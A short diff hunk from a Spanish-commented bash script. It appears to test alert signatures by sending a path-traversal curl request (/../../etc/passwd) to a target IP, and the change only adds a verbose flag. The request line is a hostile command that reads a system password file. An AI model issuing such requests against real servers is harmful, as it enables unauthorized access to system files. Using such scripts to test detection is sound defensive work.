@@ -90,7 +90,7 @@ vIP="$1"
             echo "  Intentando escalar hasta el archivo /etc/passwd del servidor..."
             echo ""
             # Alerta: Web.Server.Password.File.Access
-              curl -X GET "http://"$vIP":80/../../etc/passwd"
+              curl -X GET -v "http://"$vIP":80/../../etc/passwd"
   
           ;;
 
